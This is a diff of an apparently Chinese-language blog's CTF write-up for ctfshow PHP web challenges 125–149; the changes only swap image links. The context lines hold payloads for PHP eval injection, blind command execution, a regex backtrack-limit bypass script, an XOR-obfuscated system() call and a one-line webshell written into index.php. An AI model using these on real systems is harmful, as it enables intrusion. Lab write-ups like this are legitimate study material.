 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
@@ -514,14 +515,14 @@
 
 
 
-<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_XW87RTD312.png" alt="chrome_XW87RTD312"></p>
+<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718729.png" alt="chrome_XW87RTD312"></p>
 <p>和上一题基本一样，过滤了一些东西，不影响操作</p>
 <p>payload: </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  <span class="variable">$fl0g</span>=flag_give_me; </span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_Dl5Rm8jFAT.png" alt="chrome_Dl5Rm8jFAT"></p>
+<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718156.png" alt="chrome_Dl5Rm8jFAT"></p>
 <p>过滤了下划线和中括号</p>
 <p>模拟传参测试出可以替代的字符串</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/flag.php?ctf&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(curl(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -557,7 +558,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.+?`意思是，在ctfshow字符串前面有至少一个字符</span><br><span class="line">/is		s是匹配换行</span><br></pre></td></tr></table></figure>
 
 <p>payload：f=ctfshow</p>
-<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211113173127022.png" alt="image-20211113173127022"></p>
+<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718141.png" alt="image-20211113173127022"></p>
 <p>利用正则最大回溯次数绕过</p>
 <p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>python脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://27574079-8974-467c-bc5e-17d6b9cc7c6d.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
@@ -577,7 +578,7 @@
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=admin&amp;password=<span class="number">1</span>&amp;code=admin</span><br></pre></td></tr></table></figure>
 
 <p>不解释太清楚了，学到这里该懂了</p>
-<h2 id="web133-无回显rce"><a href="#web133-无回显rce" class="headerlink" title="web133-无回显rce"></a>web133-无回显rce</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211127185417656.png" alt="image-20211127185417656"></p>
+<h2 id="web133-无回显rce"><a href="#web133-无回显rce" class="headerlink" title="web133-无回显rce"></a>web133-无回显rce</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718801.png" alt="image-20211127185417656"></p>
 <p>看代码</p>
 <p>我们传递</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;sleep 3</span><br></pre></td></tr></table></figure>
@@ -603,7 +604,7 @@
 
 
 
-<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302155428801.png" alt="image-20220302155428801"></p>
+<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718998.png" alt="image-20220302155428801"></p>
 <p>web133加强版，过滤了curl，grep，之前的方法用不了</p>
 <p>看了羽师傅博客发现没有限制写文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:F=`$F `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure>
@@ -650,7 +651,7 @@
 
 
 
-<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302194944923.png" alt="image-20220302194944923"></p>
+<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718052.png" alt="image-20220302194944923"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p>弱类型比较，只要让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
@@ -660,7 +661,7 @@
 
 
 
-<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302195947529.png" alt="image-20220302195947529"></p>
+<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718854.png" alt="image-20220302195947529"></p>
 <p><code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>
 
@@ -697,7 +698,7 @@
 
 
 
-<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302213827488.png" alt="image-20220302213827488"></p>
+<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718920.png" alt="image-20220302213827488"></p>
 <p>多增加了分号的过滤，不能用三目运算符，使用等号和位运算符</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure>
 
@@ -729,12 +730,12 @@
 
 
 
-<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220303175202944.png" alt="image-20220303175202944"></p>
+<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718694.png" alt="image-20220303175202944"></p>
 <p>看到payload的我一脸懵，使用中文异或</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br></pre></td></tr></table></figure>
 
 <p>这个我不会，但是^没有过滤，我可以直接异或构造</p>
-<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220303184731286.png" alt="image-20220303184731286"></p>
+<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718804.png" alt="image-20220303184731286"></p>
 <p>scandir() 函数返回指定目录中的文件和目录的数组。</p>
 <p>写入一句话。进行命令执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">ctf=index.php</span><br><span class="line">show=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
